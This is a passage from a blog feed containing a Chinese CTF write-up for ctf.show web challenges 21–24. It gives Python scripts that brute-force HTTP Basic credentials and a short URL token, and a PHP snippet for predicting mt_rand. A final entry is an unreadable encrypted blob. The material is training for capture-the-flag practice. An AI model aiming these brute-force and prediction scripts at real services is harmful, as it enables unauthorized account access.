class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = f.readline()</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            password.append(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:</span><br><span class="line">    s = <span class="string">&quot;admin:&quot;</span> + p[:-<span class="number">1</span>]</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>:</span><br><span class="line">        <span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(base64.b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url, headers=header)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h2><p>题目失效，直接提交</p><h2 id="Web23"><a href="#Web23" class="headerlink" title="Web23"></a>Web23</h2><p>这里要爆破token，从1位开始爆破，爆破到两位就得到了结果，咨询了一下队里的大爹，一般最多也就到4位，时间复杂度可以接受</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fcc8f213-51ad-46a2-b4c0-a54c888688d4.challenge.ctf.show/&quot;</span></span><br><span class="line">dic = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        token = <span class="built_in">str</span>(i) + <span class="built_in">str</span>(j)</span><br><span class="line">        urls = url + <span class="string">&quot;?token=&quot;</span> + token</span><br><span class="line">        req = requests.request(<span class="string">&#x27;get&#x27;</span>, url=urls)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(req.text)</span><br><span class="line">            <span class="built_in">print</span>(token)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Web24"><a href="#Web24" class="headerlink" title="Web24"></a>Web24</h2><p>伪随机数，和pwn的差不多，直接写</p><p>先写一个php，看看rand的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$t</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再写个交互exp就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">randnum = <span class="number">1155388967</span></span><br><span class="line">url = <span class="string">&quot;http://0c934f54-6ce0-4aa8-92cd-f50b1541fd11.challenge.ctf.show/&quot;</span></span><br><span class="line">urls = url + <span class="string">&quot;?r=&quot;</span> + <span class="built_in">str</span>(randnum)</span><br><span class="line">req = requests.request(<span class="string">&#x27;get&#x27;</span>, url=urls)</span><br><span class="line"><span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SharkCTF2023培训</title>
      <link href="/2023/08/14/SharkCTF2023%E5%9F%B9%E8%AE%AD/"/>
      <url>/2023/08/14/SharkCTF2023%E5%9F%B9%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ed795149d0edf698a60ca554593a0ab81846ae1391a4aeb5c760b7ecbd23f81a">11e9df305dc8ef7c4d5b4858867c06c9746ab7baedaa016f416c16681b64fdfcbc9abb2e1824a01831d462cd1c7a577426b94c44a0ad5c2e7ba9ab6af5a587344a5d24f863f779c0612fd18f1d769bd76784874e5c19adece13c29a8f5cf881cfbbf8dbf00ac0197c10ca408784d7538484dd39305f0cc29a593fdf534b75e36b808205b390436cfa30288a191f80b619aa3b65b236763e9c9e470e15efa2885cf39d537b09b1e678afa4623e7e4d2f361d6525b449868b3eadcfe209f7613c5568b669dcdd195ab320b45733baf59c63204a40b92870496e2612c485a7bd7eab2632572959317f9d89935a7a5b50724ce013ed68f910982f2a5bf8d52a6f6985bdb2e2079aa1feee65158c28155f9e9665327e50492c06792ccad6cedec93918f0a9aa35cd1c278aee9fcd0829ccb1ab845c1e7354f79c040211b16c37a1207295800ced8852af2154e02f2c7a4e80af607202434fe4e707074c6c72d58bb82d059dca4d68f05ac30ed9b7acdfe88bcc8b827a954c1318c87b4820708ddc96160adb9ce167b8d9116ce49092b9a7efe868809b598de63d24309c4d6e9a33f7f760d5ec8c066fba0fda48e9ff7acfe2f2fb5ef57a926189e92bfe9784744ac13d29bfecf4accb4d5a62b96715f2bc46e76d3908582477752a572a1cbb12627c913ef9cd38d41e91450aea291b5c830d24319efce8af84ef2e4a66c9d6dc7245adacdd8fe0509beffcd55a7ff8bd22f39935a1340a846918dd5695850e9d2d43ecdbdb404b9d414b2f04875f250aae4037783daf4e02215c2b1e5c6fcbf4edd76d7f72370aa537091ca629c8928d95c748e3773ee82bda43cb02057c077934f53cf884f73639b40c82b64a012e9d19dda4da6785bded98ad16300e493a71c5527c7343d8abef60d024917f9ad845e9ec4c2de88f45dc31c3ee919217f0a9c9d9a1a60e6a3cc5c7f19fa09cd6e242ddf4f7475b3482e6ebfb85a309f59aaf5c856e4197ae30c6eb0ddd92bbd88da20d20a8b00bde34ea382f5535686223ed30278836e7c426441354a842e7d3dc6233017f9bd3ba19a03e4be3f7f447abd0bc7f0a17649c50009db59bc2bc7670db7332c9313e012a664e8e11453a13499a9ea2eef1948d2f63e9d255b9add3a5f31a31650f04e114d9db444189dba8af95099aa44f91b6fea9cb3820b38bb29558f4dc9eb6380f0319c44bb7a36748f2d168e7a40797a0731381cb7099af4f87d2d49473209fca7a6b08a660fce41358d2d88717abbe48c88555e1423c8269506368c6696bedba0840f9fc7694792f64d297a83d20cd96710d7caef6018dd8c14ceccd020aba5eeaaed35d5edf9bf2df4091f6e0109edaffbe15a09b72dcad2546e14ae4fac41f75a047748e27981b018588dbf069b12b5ea201513c72f02efeea10f6762aa9baa93023ae8872b94fec4361cc111c83fc19acd4f129ae8c214d9694a7567bd45a596f66452458de6dd2bcfbf639d8df2c696a111ac0f50496cb060f4f0215bc7680f48981f32461538c2749941439d96b6195c9e47294bde93e3974c63cb3e019b9b2661003c269d3e8c0e583265cc8550826833dd58a6548b31c9f225f39d2567478f98e184fea98629ed52024cbd66f13bb8e80535e2b7216f32bb2e4a4579ea3cc4e2192e24fb9a3f91343467d5efea7d72450b43497de8c45700d85852dfc0fc9a1ff270e42d0a9661be15e97b0b22c70a35806b1e68023136b49dcb04eb5d607b4ea6e7a89c7310fc91a05c66eec363feaf00915038a900a6f75e770fc89fde89a1e9fe2cc8d0d0bdf656a769bc2a881bb401c85fb0c98ba28fff5b08980b7151029f85d7150129e6c3c3510a9d1ca73cc60a7d51d2a37cc2f8ad9f9f0e75e1db843f68a91aa289fd37bf0b6d9fa8558ce8bc6130c0bedb2b1d1d05bc4c79dfc02e32b80c9332c54e149ea4fbb3e6628cd34714de1d2882fcd6be79e9e727f7a1c1f21a3575f167fdac24b277b5b4da6e80023c46156638454ccd55eb0a589d00f23de387280f4c2be27f34f95547b4c7ae913792f4524fdff3fcefa6093bf986a6db030a6a8c0b16a6cede76e6e0f6d3e80e55c97e428609446aedb2a06622398c443880fa28cc734cb08e76a0a483bb3335fe55f3f17d2231c1d5d1b0014288a9f1008f94c24e1848046f77f9e4a2ac15c71661cbec95b1a68289824a3534915bb9d301c3c9e2f8a9211acb7de4af9c7acd3f6c9b65098e220bcb019340558c74d97a9b02cf0fd14b1beef2b2a53d43b43bd89722168e06bd00f2964470a6a2f6fa51c83dfd657730d668824e2b3cf3f5ec2074051fac083d2799a5fa36a9822302e5c485fc24f2bf0405a7b5c3aa7b8937df267686f826298cf4643328e36d2f82c77727beb67e065f4bbcd0c2074a9fc416755c64478c28cfffad7141b4fda937a408da35c445ba948e230fafa38c6a6acab29443cb8a9bb505548b1353e9cf9edfeefe47d154e870fcc7e02a7bf51a8a22187768cccfec6889a25a721808c1ae7862f550cd558135fd1b8315aa46b6ae9ff7e31edd01f5974800ca7d9bd490f152ce81e4bde6a00aed454f18cb57f6e852341ff551ba7de7170e2969a68567f1d7829df6d5ae958bf5f846b251782d6d67342b430bcd2ce7e89781a8f29e24888be994a02c7ac22407b98839373873ae15583a4ed88c315c2219eb9a538fe1ad848967c0b76118a27b8096e6c6ec887a03078c8e860670ba34838d26cc947f9c2d741617614142bb95d557c4bc58d3f66167b24cffaddfb1773817ddff2fd326ea3406ed8d672cfcb7cfc28300e356729333c3f4ebdee65627cb4ee23aad067421e9b360195f058b82a02963f15248714f7fa1cef6bb0ac34441984c3032be2ac15cecd325e4b54b06679df424862e2aa51f7df4018b43914300e836b9b0441ab47b23f7646113367145ff361b40a9420df5765525b95525dc99a78766e55f8fe7a2aa27737fc34befd8dd6b1df0c094777982c0c6c39d415d8c18eec186b3ba6970f26c5d4e78628e06947184d911641306ad19fdcefa3c8b0a0c22123262ee3465389e8e2b95f7a9523bf660c6828672987ae43c954e1762dbd25309cddc1dc3630ed313d952842beaf8062b6f9cf97ea251360507a00dcaa83feb56cfc51bc1ea304ca988593cb0bdc18b6469b24e7e3b65a28348dc940f2a92b63a65167cf6148cd35f357b4168eb15c599f223cf40adf6c27d5beb759c2b5e11708969333e8022de93e7813392d97e1c9b811f861f3070c46151552f792df9033f5b28df455e139386fd2066cf172b85f689d01f0648871eccfc25ce32dd2918e0bdce6a56bbebff8bc96eb16a2212df8838119ed24774dc060caf2ea95826dc06e896129af8df85f9b01f3158d759017e24e469bf75a6efeb0d619bbc99ba3fe63bbd066b42b764bbe716736aea66d35aee01e050841642679c6d08f5cd3472fd530039ff86c319a82be8eb82749df23f7769d92cebf704f050a3cc10f9e8208aef744bc3ff40a4bb4346f5bc6831c50978a45b825af1cf813111c4ba6d4643cdc3b8fc1ef23afc083ddb0883611ee6bd627782a5f1f34fc8e9a3577d46b5a662987723b8a256d6196e7d81cd7aef02bd1fdcc38ce729adb3d71b919735ebab86e8154186e894758c4fe48d39c32b6f4578b0592cb58352a31a1b4f5a062034f4f3e2550577c06e403021162608c8ce5233e862a2fd3c2ef458aa48ae6b8a8e2d2e7780b8d9c6ca0cf17fccb3e9a02c31c142e515c4c815a25b59f4935c3dcf7b0dc1a0625f0b3931218c06b152f42454b102d7d60813bc4e2b3c225acf11d01267582694f1c2930d092bb94f5924ddf6b520f7010e700af16d4fa0d13ba17d41ef8c00bfd96293d96c154ec922a7b39855cfd44e1fbce9f7f33f61bf5c73440b1da679e0a4b9f80c5b993e7813256a6a9ed6f53da678d893a48ceb15944ee6da061729c340cf74fb79e318d289eb4ab629e5ecfa5e9d2c3700ad52f11198f1c7a2f946938d144a58670c8e0cb768f558fcb858ded1595fd493b776fc67dd58f676167d7ecf58bb450fee17b78f762628d00736488a839a0ab490995d9e659cc18b0fc7eb6666f3e0509ea06146904bb50f6fc8881ce00dfa93219ee025b266b6de5bfc9a7bc50070578d97a8754490e86edebe51dfb9f3c0cb469b1135ff1f5799a61df2fdab4f3712f7c291e05396c8f2d956a8d9b2433dc202852629b5b5fe9dd2b8ca1918ad429451a71d7a830dd53e275f3ec06b7697464f1ad42b630f67f810b2f1abad4b88b404a4e6ab6444eb095df578808f25820d1e4c9e56fca6c4c27dce1159cd4d585bc4d3254eecf6c7997d49a18a29b738ed99b8c8570c532f377deb6bebcb330ea31a6d83eb921134ddce7da5050c7e05ea8a858ecde30bf3567a44856e92ac4f70090f5b570f8c5d2c22530d16b7d50e2c3f4fb9372c00301975cb681962d2985ac353ffdff5d12936e4c251ca94751142024af2a47244ac6f664851da29a6db9053aaebc8b94e10619196bf69a4f9400e64af42ae005bf67f5b9a54b183de1d9bc9b024e1ae33f9c67f030909426c5db97108c4abb2a8c578ac124d192217dce172a34aa952116a42c18a77317665e1300185b8e5a9f4986500614985dbea44dffae5cbcf3e2f43591ced315f7970bb6800a13ea71f527d58e387211a5bcce234497da1cfbdc03e150a777bcdfbc471fb1661a43baf0c4032c67dacaa811eb54d5ede5698215be75705bbb53e4b776f98e4037e9122c78a0c03bf27d3a315f5ef3813ff70a4ca66bdc721cf4580a8ac78e714bbf8a2a56d1c0e8a74c2d54ce71bd099694212ed6c19e50646072dc183512ddccb29438368a7984b820ce5532def0828e10fa2ab70cd40a6a5736df30819188da56324aec6a5e582fa2519c3a9d53d3984acfa6ec1758ba4b5367908e19a8940bf0ce860d8439d815423d6f9ca50574c3bbb66001e3b3f594e5770e821d3015a9265d7a6fe41acb28fcb4c7895a8eb64dd1ad07380a4fe31f2aec976fd75ef11390a1c1a7642605533d7b9110e1d95983d682b398c1f8b80121abe25a8f7be9f11cc47d35cda3242033a8eb37ae096cec16572c703fe95b832bb9e008a413fe5924a349239ec84ffc92b02f7a368f44b52302518cf237b735fb847a5a853a39a444b5601262921bb03aaa0a106c51cd4ac180a65d9a199d88f2b028dd3b734b2cc84f225ecbbeda8b6e54df9bbd283034e50a4951195e8aa672bc577d76201bc7e1611557f3c57249be0e95bd2d9e8906ca6360cfcc7d850ff73a191e297c3e5e8972e6009f6331176ebd9b5f2e362f71fe67b14895ea81762d636d81a0253aaf5184884cfc028e2fb1d7fe2580bebff2d15a8c2e9801bbe1202e353e5bbc5af553df58fa9a1e1bd49dac19c91107d95e78d7d814e6f61b86cbea33b9c7e3f25f12c691c582f3da3f5e1970abcd99846f1b1794ae516c7151becddaf39d4100ae8946ef037422b7a5ceb35c7979c190957d0b91f3de07da0c66237fc6573cff5544282040ce02add53696745e327d7225062e41e144723f87983eef691113b943e42f876fe787bcc2e3177ca4ed7f2f3ab431fcfcb229a4b036c5a1e0d833360361906a9ef5769c3d5aee22f6435f1a5ddbf62e7d35789549ebb9c1b12d07a0ad6064be5c01a652ade07e4e159babfbf4f1c4443377fdfa83d9bd5ea0968293635ed1ba3a31143e1d567d0855a06d6195750e535ac2d9089480f1867349738a6477805d39a5686772da768c3460eb71ca85fb03a2ffa63402ec450c50648941686d2f693317ea7fca9f6a486c4ffa190d112afcd618567d1c74103370fb37ba6e0401b4f47f8a881b94143ec0330ad3b001ffb7a0722b5b56dfd32f636caccf6fc9238b6a09f9a7f28482a62d6eb83031c41bc5b492f9fdc89c2842d24d6766f387896e0f55842346fb9a32cdcdaec1d21bca5fcc70caa09295b53c6ce904481cf95f8f5af72b9329309101d355ae35633618d27424679fa5f9b261525b1de3572bbb46e73470b5f43ae77c1878228ec5c7f7fd364965f1d4d8aa56ff6ce4505d4a0182d5bf92b9856115b16d0ac13338a4b3a56d7ac2262cd4538c5f3b382e4db24631f92f01af90e4a62f875a00431d468316a00e7a67cbc898ad5aa34d3619158b406ea12062025831a9d1f34e0315f0b47ca949fefd8940ad1f5b9c07ec623d1023d40b95d54c17053a0942dfd2b553b829271055a0a78b5e344f8023207a1f6e275f0d1e98c98b01f5a81de7410d1ad654725c3c0eeadbd45ff02d763739ca24becb46874d389ba3946d65422524ddf9456234369aaa57fc440b7d17037f68021fba88c2785e277fe34e9bb64594b6a89769c18abc6677a7cad28c30a2b21f2ce7e8e6baebae30ea82730c771acdeaed9c56b1d548fe1a5ece7e7f94cc8c07746111b922e8477ff1d06ccfc41dad3d07c1ec6294af855d5ddd223b7972c1dce1286bd7bfa7bc94ddbc329c1ef9a2ae5fac452408799aa354fe2efe70de61fbe9fbb3e7d9986d1beb15126e0764e54b9ba23f44e7d7a94e51b2cf37a641e9912851011073b865a5aa1450dc988660f8757b56165073276fd1b6c6fafe4cadb5369ce6a88d912b069cfbc24aaa5af2f2425edb7ffc90349892ce87fa8325677c0de773c6738682ddd57f9233f9d654ce1ede97b94e412f15b21baa4386a7bf7f836e7b1eeab5f45a8cde428b551045e1b2b088e9b19a9b1aab6ac5469fe86710c2eee0c12a9a4757c43600344584947e79f3bd4176bc6c1abfa81a74a30fecd1b05e6bd645c957c2e6abb17ce410255e5f560e42d6e8c5a733f24c58db7af53867cb31e991adc6897efc7ec4ee3b57daa671333ccb9531be65460c1dd0b432655d9e9cf1dcd33618b2b782f6ab420bed219752a091e7f9b99f55c168a22722d429eb26cee32fddf3879fbb3aa0b11f5b6f2fa323aec9605f64f8fe0b0b086acdd99d4f1816ef11ea6a3806b07d8624f072ff122853aeffc7aa3c39c7ff42dfbb7468c2b77bc3a6da90303266a34eda7495c969b273727cbe07d9ec05699d9cd0d6b061fd6681c295c4d8fa88a5eb551cb7d5d6d37887b07d8fe00e14cb4567739b0e75b59a3f077fcd165b87937cbdb682c1f60fed04a430b316dd96da9901fdd60b43614828856c1b88a5192fee3659a6ffccbf5139e08f2f0ae9fd86fcf4e2675115cdbdf2cd208e27e81cf5ec07fc3ad21613d81da67bdb816a713541f2998ba5c23a4cdc79f4519b3d0b0b4de7fd50b72857e14fc51243b6faa447623c53386b2b44f2b46e541ce0dacc9765bd578609d56d571eb940652746d6094a25be583ee9585339b6f16488bdd6eeba530dd91605dccc9a0fcdc2b1956cdf740a3dc265397036e91255403178f9be4f553fb514ff94c9d4e9dcdc5a6e06d9af1f50db46b775f3c898ec507cc4097935a8ec24824d913bb2f832439f246b66405d00190b668599ba70e4a6ae2832d05c59fc3a4f7d18d6915cfc8acff7fb7e7470e07444efc55094efbb4c4429ad88d55efe9de0c6fe53683763146e7e95dc8435f1ee6302dd898a85d8d6b8cc187382b3ce276d891385137e19baa642b21a1b62408b8dde1c91e74026b579b65eb5f320753891ca623146f692f1cb5a13373d417b7f448dc071150c0493beb6ba3289eee28ff2fd2ad32cb5b384e35e932e6f14f31c9317ab48ed66fca0654b5a736bc14dd37ad5c0ab528f2dd4532755856b0b354b6ee274281f7928c6350490583f254b172ccbbba48e314e58bed4467e880cceb8dacf40109c6531c497a5fba44bc1a01573ee7225ebd7b73ce14589b91238d06da7b8344ab86cbaeaae3783ee1782b454cb3cf00b8d3d8e1ec24f8a9bf3d4adc3f783c653873ee12871c85037dafcf9beab423e8c579e2d5d9ecd90274e5fc0f9fc7d85c5ead400117c8571f3940a3c6e8093feb1f4c2cccb712219c80414128067eef47a1d9e1ab25938561dc4887dd2458eaaf924b05949f14c5379a205c92940d3e0f052bc1e7cdbf83b7d3f6d121cf34d6f548b2ddb36d7d797da1a6c32ed82417b7b3c48f7af189e75d7cd82aa43bdcf0a4a14abb545402f9102f0b806e0eb6466aead359b0896eba47d5fc07236c05bd152864f8892ec5150a96d144307dd61d0fef7ce1501ea14b0be2041f7251c815c6288652e4e51db16ce309915bc53baeb49b7b2417022f2b51ea7fb09a44393deeec65c94eddcd7ae9b90d7fae0b2c885338e575dc8240f0985112e64a635ed1e1f5ced1a07137d7196e53952512cc373f2d0e43f40aa39cfe461609331dbb950e9421cabe82c5bd84e50730a4c14278e7b871fb211935ac4db9c3ce6bd092c722c0847f550b7658f77c1cbbd5bcecc0bd766f46d6a216c1557c5138517677e2c4b9385bce19beca722275e4abe61954e05c54cc835f3870f35d8acbfcbde0aab8830f72413e362b096721b442a6ff3935ca25b9490fda5f66bfecfddac065a47c7d08e9085a1e2b6b9207d2f9400785854234d233ce28b4cc8f822a49d33ccb1c1cc55cdda34dc4cd4dcf9f7daeb0dacaf071a0baa841e2ff20f1f09fb1086be71217630aad5120e706a3cd8074effe2727a3ce103a795353b5b5568b0914e86e55102146b97641070ea6696837fd512e384647f7b56fdb43b130b2617494670ec7e0525108b214a9a4874231e74ec2a9e52e4c5395600550a563af968d5e3f78bce9ac66350ecf059419e501a103a95dea142f83ba2e41d56b4d3e92616985f5c1ca98aa6684e512e522735ff6b31d885c92602dd6ff0210b1bd5c4b908a1290ad3c2365bb3afa9e9c2a61df4d09ab514026150067b3383020a520181e8918bf55e927211918cecce309acfd268d23954f6e218ac46564ebb09e198008144ce74bc9c7a9dbe70c06e00f40c5e7d2da70e2c516c760027fab4c4ab2b183d630b72a8c567b0dbdeef6a62847b1635e8e202a76075338ad31df97155764123e217a2368e1b24db2b035f785c9758d3631d0042d38f5be4e3429ab6cafd6a761d0204befaa1011a5936fbf8e0716e1bcbadc5d8557a3b2856750de14ad3362c5d7b2746f41fb4ca4f4e04ac5f0349a204b0fe052e79870bad9d43eef677b6ce5fe19d46c52399f1e08790bb86c4b4de2a7a3e2434ab133d346d2d0cc118899c243f60c23a48ad20d9b6f2aeb1a2a80230a3cbd04516bb2e5cb997021f439061761638b0541ef6c0ed94de2d312679b901637365a1b4905e160544cc2649f25aafb8547b9b954749653565a8c65923ed76fdf777616d9603761b00c305596b994d652d8aef84f036251a5168834edf21b5ce37689f69c9fe3807e0d09442f3fdaf66ef762e8676f871ec6ab6de7dcd02b987226b96fa83fa407100e41a3bc0bd27c409fe33d00050c5cf6df4dac48ff8f7858ac9640cc7232e9137967ad9c7b2c0c9a5c3cc6c0d478d6c9e9ee2963992e55c9d385eb437f9040dc073005c929fd88eaf7fe11bc46f1082419e269fab1649caf835edf78645936ef3293fa30b38b362c39203e341965026f2435b73541bf22b72fdd87356d17ae076c379046a90053712e0606ff4dd8996bb278027062dd9b4b3a82d1ed9460e93b321c7d2a0f9ce1b759655405783487e2bb1bbab41c01c5f6f9abc95ba43d443ac938652002ca0abcc8d81159ccbf257cdcdcbbdb5a15e134fe0e1eb925ce0e77b4b5ed28d723c09a25592e0330a696b1b9ce59c35ae2cbed828bdfdb6246bb2629f10a0b6a33be41af83479f3ee117891a4df1494f87185f07e088559c235dd438ad096a4a8a4ca8cd56f3bfb084e2c578cf6dd92be267af6c966aa8cda7db74765ed51d1a85a709aeed9b933dc0482448d2e7b95e55c054ec044242436fa072c4c4e3f4d9fb2130ec270999f94b30d3a3a34287982c3a5b8cd4cadccc5c40684f206d19479c3f7e0447bbf33a9a99285c8d8a720402f0792bc12bfc23b4fdea544d66252a60e8b5a2fad909adb200d124269e7cca6454e45fa57921d0263beaa6123f641910e557a3158cd1c791f25bc62c4c866d157d9d77a65612088b5349a3cca5622e8abea0eddb73ac23e7894fa57dbb96bcf1d8f232859555f5d002e332e3c50fc41886f8aabc829d7409ccb2a8d5816c84e53c568b3aa0dabc52e4cf9546d4f278905532fec97e295933a989eb99982f0ce3cc399e028ff70188922af5d75fe2411ac3206de3d09bf6ea42742eac3a89b7a1431b6b4e26bad1ebd010403ce80217bc8f7483a07a2e9b4b95eae5f709ac6a151e0f56b6870d07f02b0fd61f64dd8165b1936a70c0eaf4e83a268ed777deb07623366e48a76a44cdeac6c11ac96aa28f3302b4121355b8ef499ea77aed786f2ceb725f1a9c230a2827db09b0a21b8ef1d0521d9c4fa836bdab6886562a2ddd53eef45aadfac01afcfcc06fdd7608067e44344f999bcd6e04dd4d6f70aa92e9d7182bc5d45c6c4a41ed576dc9564eeaaa3d6a09a104d1ea3f198889b24ec13b74cac43bbca8f46d6834a1c87f31933132dc3bcfb60f92b4cd4ec02102cfb73b80ac09b0b599d0e77a82a109f08058cd8f24e2604163c3c6ff8f3d7027b8da7203740e30973104b4eb6235ea611f749667547c9062a18121c8080a6cfa01dd77251a3a8a09bb112cd3a66b73520508d9b8fc6784328d1353ee0398ea13e3f80fe55109740b1a72cc34030164fe719c982bb3fa17d811204f0aaa8c73073e4fb72eee872e62c1c286c13fa7f44ee8ce7e0a73866c1304bd0d1e2162c839f629cca728155d013cfa25bac0ac4ecf353a2f18d977293602225c6a64d263477e9980222e02a07eba510b73e9f7307f15abef335478ffb191b1525c89ecbe03409852be3e538cca7a9302036aeba0cbcbae8eb53e0458dfde3fdaa81406354db78bcc11d248d75b5bedd86c5a835f23920d5ff2595f5963df6de0f30a0164675737fa5e3c3c265c6222c0b6ebfcd7b3b681a80474d101689c6fdae21f94282b400961032a611cd37cba173225edaf88af4d9dad05f55708c26043d27077026bfe397816399ee6a3d30976998dde8b88f60cbece56abc67f532c75251519a0dc2cbee5075258e2e41124bf11ddd59cbab57a00357c880721f9eedb44209cf603e25b239b030d096d46f354257f2275d5562ae836c638667aa1085f2fed40ef689416fe80f4b51e0c62ea229734277aa1f43391183b677c880f1b622d8f9d0ac9d196b4a899ac39262ceaeddd4d5075ba5c9e23579c952ef6a0d6c5f93cf4cbeb474bfb44816f6ce3a973d21c81d958bb0c44e7f5fdb97bf68a38cd0792fceb51e299fb47e84554fad9b55c1732230e1d82b89ed80a42b2e3728294e882d0487f0759d7ac6ee14e212588cd743ecc4e0fdf614d3091be4150c344a1d325b1ff92bbc5738a4f40608b779ad93fe2992853ab110a4a366eaf843bb3c589ba873fbac6386e9195cfefe526dc3c0d2221502f4158c9625ec9e335be39520a632f2bbca62150b3dbafc30af1227c1a5c2723d8bc93cebc50d2eee48ea9c9c9c1f3e278c1ff3021eedd0ff9f6b51e192285df8125f3c984fd3cb37e5e6fb56aa9962b251b82a183cfedd8c056ef88eaaccdd3383586be62184812319dadc124e0e29bc0af6675d59e11c8723b054692921aa23935548e0fb31cdf5c4aa1f0a1c3789e1587839297ec85c4d3a780eccf94899aa8608991170442a0d314fae238b0a3076f71c8fad0d7b1bda5a7fe1b1a285247e778fb76187ba4b452bf30a29602d6765f3f004834c73cf78af05d12bb82ab5199aabed527b6c25b9a74c631eafe1f70c0fdefd17005d7040bab6d597c7b5211cfe4b9f27a590a8d6b5e848778b1c9202db3b415956eb0fcc90fe568859d42e2eeda6d03abd705ed0c9afb0d2a0d3bea6b972758b22dc6f8d5a14b93ed20d5502f8921746fd20037578364c0a2c28c45660f7cce952ddaeaf4e4bf6a82f30202d2a0ab04cd10434f525e0930295ce432573ee30f22b1e87ce51c475a64c9ff0f2f627c340399dc1210a0387a16fd30addcc1f6f3565ce321ae1e58ff62c1e86f9b12010c051c590e3f64f1096045b32bbb15e57f772b937a7f558ffd138b2a278a6817757ef241642d62cbd1bfe617db458dbc0eee199b1bc52240137af459832c43c060f0256b12d4d06e96409bfaf3898d590a4a82f7f6a91c3d8a00fc154eaed3010e8b29611e1e8b0d9e6a6eb4d3d68fdbb2c6bf8442a4429c7501eac5a22f62808c02e8e406093fc14f8578fad92a300db9bce0807b5a6b6e44b3ab3be5826dc6a6fcb3ab35395183c218b008217679f4b360b9d242e89a090ede4ae51182091ce6aad1a730da28d5644caec5883ed88ed30d8ef28dde2f63a91c1135fb6c98439e148c47028a111c022b169ebabedf07d1e287e663785c8f18a2359561721ae921ab3261b2f8087f1b6894f6c71d9689ca54f2f32e87e51688f9028becd7d9b9d6857a1c32fe2466f44d69dd832943354f98efdafb7516289ef0c81a54e8cc2f905ce54c57b6cd7bdde3fdc1d13e16824fca25c5cee7ca17fea0d76f642e865c343bab27d9e82d6149679a1df2ff5ad39a64ef3e7d1f6f2185ec5a1d465f331cf5c96336875ba5633905ab5f65edbcf85db189d50643a2e4db118e8de570616bad85cbcd9fe76ae6e087675ba11bf202ee27f2afe8db6a7851394ff74bd475935d946b9b7b95f9f7a503a98e65b94c96659946545f8bb26a9c4f01e6020fbb5eff71d7806bafb3a97b79196f2fe8acd1859a8caae13f6b362c9e5f3bd0f5718f4d79f4a4bcac752e17630bb25f6eac564deed92982e3f27d72dd1f72ea3048496bfb44cadcb8bd45cb9887d2a7754ffe2d5404654db188f38bdced4a2bc13c284003fcc3a4386e3b041d9cbafdbdbd34cf68b69d96f88747a509be080b9ec957a6a97b5863d52a664516e6caf318874900f7e57cb3139ecb5956d81e30280940c1ab8eb6ee613d99af4480f6c4865c4b24609c8aff52fcc743cab9d7a6962d58c6ca6151ba494276d78fef32825b0bdb2afa889ad51239186eccd91522b3e327e693c8e8e7e67433206489e800e0e0bba52b9907818affaf0881cc8c83fd4a6d62840eb76c253c95ca336f4b9f692afb9280205b17c4568546a29b2eedc31af084397e74447dcf00e65f2b0e19a2a5a99e18ab7fe66bad2aba07c726f99c78d7802ccfb909bcad1ebdab8e442829e4595160bb22c2acdd17f3842245a3151447f81da64d561c099c2ab1119c8047d0f3a0e8e95db8c4e501b126ee90c15b7e50e73ebd428c5c0b6abe60ea4a86fe187a8ea6550c8422fc57ad38b7533dfd2c6add48360591de99dd6938db8069b5f8acfa64604ea3b2f21fef98e39e642ffe